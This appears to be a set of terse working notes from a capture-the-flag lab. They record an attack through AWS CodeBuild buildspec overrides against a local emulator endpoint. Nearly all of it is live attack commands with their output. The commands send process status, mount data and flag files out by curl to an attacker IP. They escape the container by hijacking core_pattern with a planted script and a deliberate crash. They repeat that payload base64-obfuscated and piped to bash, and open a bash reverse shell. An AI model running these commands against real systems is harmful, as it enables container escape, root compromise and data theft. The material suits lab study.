## container escape

aws --endpoint-url http://floci:4566 codebuild start-build --project-name zztest2  \
--environment-variables-override '[{"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}]' \
--buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - curl -s -X POST -d "$(cat /proc/self/status)"  http://10.10.16.250:4445'

//  check CapEff
```
Name:	cat
Umask:	0022
State:	R (running)
Tgid:	14
Ngid:	0
Pid:	14
PPid:	8
TracerPid:	0
Uid:	0	0	0	0
Gid:	0	0	0	0
FDSize:	64
Groups:	0 
NStgid:	14
NSpid:	14
NSpgid:	8
NSsid:	8
Kthread:	0
VmPeak:	    5080 kB
VmSize:	    5080 kB
VmLck:	       0 kB
VmPin:	       0 kB
VmHWM:	    2448 kB
VmRSS:	    2448 kB
RssAnon:	     184 kB
RssFile:	    2264 kB
RssShmem:	       0 kB
VmData:	     484 kB
VmStk:	     132 kB
VmExe:	     896 kB
VmLib:	    2252 kB
VmPTE:	      52 kB
VmSwap:	       0 kB
HugetlbPages:	       0 kB
CoreDumping:	0
THP_enabled:	1
untag_mask:	0xffffffffffffffff
Threads:	1
SigQ:	2/15345
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000000000000
SigCgt:	0000000000000000
CapInh:	0000000000000000
CapPrm:	000001ffffffffff
CapEff:	000001ffffffffff
CapBnd:	000001ffffffffff
CapAmb:	0000000000000000
NoNewPrivs:	0
Seccomp:	0
Seccomp_filters:	0
Speculation_Store_Bypass:	thread vulnerable
SpeculationIndirectBranch:	conditional enabled
Cpus_allowed:	3
Cpus_allowed_list:	0-1
Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:	0
voluntary_ctxt_switches:	1
nonvoluntary_ctxt_switches:	9
x86_Thread_features:	
x86_Thread_features_locked:
```

// some further 
aws --endpoint-url http://floci:4566 codebuild start-build --project-name zztest2  \
--environment-variables-override '[{"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}]' \
--buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - test -f /root/user.txt && UFLAG=$(cat /root/user.txt 2>/dev/null | base64 -w0) || true
      - test -z "$UFLAG" && test -f /home/*/user.txt && UFLAG=$(cat /home/*/user.txt 2>/dev/null | base64 -w0) || true
      - test -z "$UFLAG" && test -f ./user.txt && UFLAG=$(cat ./user.txt 2>/dev/null | base64 -w0) || true
      - test -z "$UFLAG" && UFLAG=$(find / -maxdepth 5 -name "user.txt" 2>/dev/null | head -1 | xargs cat 2>/dev/null | base64 -w0) || true
      - test -z "$UFLAG" && UFLAG="$(ls /root/buildinfo/ 2>&1)" || true
      - curl -sf -X POST http://10.10.16.250:4445 -d "flag=$UFLAG" --max-time 8 || true'

## core_pattern 

// Finding the Overlay Upperdir
aws --endpoint-url http://floci:4566 codebuild start-build --project-name zztest2  \
--environment-variables-override '[{"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}]' \
--buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - UDIR=$(cat /proc/self/mountinfo) || true
      - curl -sf -X POST http://10.10.16.250:4445 -d "UDIR=$UDIR" --max-time 8 || true'

```
UDIR=469 441 0:47 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/219/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/8/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/7/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/6/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/5/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/3/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/2/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/220/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/220/work,nouserxattr
471 469 0:77 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
472 469 0:78 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
473 472 0:79 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
474 469 0:80 / /sys rw,nosuid,nodev,noexec,relatime - sysfs sysfs rw
475 474 0:29 / /sys/fs/cgroup rw,nosuid,nodev,noexec,relatime - cgroup2 cgroup rw,nsdelegate,memory_recursiveprot
476 472 0:75 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
477 472 0:81 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k,inode64
478 469 8:4 /var/lib/docker/volumes/74e81705829a177a4d0a1c3c7805bc1fe247769a455c9dfda3840c1ea8c7e812/_data /app/data rw,relatime master:1 - ext4 /dev/sda4 rw,errors=remount-ro
479 469 8:4 /var/lib/docker/containers/d1e43b212600cd6165d10c1ba2755a2956f61f88538719f04dc2fc493e19a1e0/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
480 469 8:4 /var/lib/docker/containers/d1e43b212600cd6165d10c1ba2755a2956f61f88538719f04dc2fc493e19a1e0/hostname /etc/hostname rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
481 469 8:4 /var/lib/docker/containers/d1e43b212600cd6165d10c1ba2755a2956f61f88538719f04dc2fc493e19a1e0/hosts /etc/hosts rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
```
// UDIR=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/220/fs

aws --endpoint-url http://floci:4566 codebuild start-build --project-name zztest2  \
--environment-variables-override '[{"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}]' \
--buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - UDIR=$(cat /proc/self/mountinfo) || true
      - curl -sf -X POST http://10.10.16.250:4445 -d "UDIR=$UDIR" --max-time 8 || true'

// notice last two line can be excute after terminal hang
```
UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1);
printf  '#!/bin/sh\ncat /root/root.txt > %s/rootflag.txt\nchmod 777 %s/rootflag.txt\n' "$UDIR" "$UDIR" > /exploit_root.sh;
chmod +x /exploit_root.sh;
echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern;
ulimit -c unlimited;
bash -c 'kill -11 $$';
sleep 4;
curl -sf -X POST http://10.10.16.250:4446 -d "flag=$(cat /rootflag.txt 2>/dev/null | base64 -w0 || echo NOTFOUND)" 
```

aws --endpoint-url http://floci:4566 codebuild start-build --project-name zztest2  \
--environment-variables-override '[{"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}]' \
--buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - echo "VURJUj0kKHNlZCAtbiAncy8uKnVwcGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9wcm9jL3NlbGYvbW91bnRpbmZvIHwgaGVhZCAtMSk7CnByaW50ZiAgJyMhL2Jpbi9zaFxuY2F0IC9yb290L3Jvb3QudHh0ID4gJXMvcm9vdGZsYWcudHh0XG5jaG1vZCA3NzcgJXMvcm9vdGZsYWcudHh0XG4nICIkVURJUiIgIiRVRElSIiA+IC9leHBsb2l0X3Jvb3Quc2g7CmNobW9kICt4IC9leHBsb2l0X3Jvb3Quc2g7CmVjaG8gInwke1VESVJ9L2V4cGxvaXRfcm9vdC5zaCIgPiAvcHJvYy9zeXMva2VybmVsL2NvcmVfcGF0dGVybjsKdWxpbWl0IC1jIHVubGltaXRlZDsKYmFzaCAtYyAna2lsbCAtMTEgJCQnOwpzbGVlcCA0OwpjdXJsIC1zZiAtWCBQT1NUIGh0dHA6Ly8xMC4xMC4xNi4yNTA6NDQ0NiAtZCAiZmxhZz0kKGNhdCAvcm9vdGZsYWcudHh0IDI+L2Rldi9udWxsIHwgYmFzZTY0IC13MCB8fCBlY2hvIE5PVEZPVU5EKSIg" | base64 -d | bash'

// kill -11 will shutdown rce
aws --endpoint-url http://floci:4566 codebuild start-build --project-name zztest2  \
--environment-variables-override '[{"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}]' \
--buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - bash -c "bash -i >& /dev/tcp/10.10.16.250/4445 0>&1"'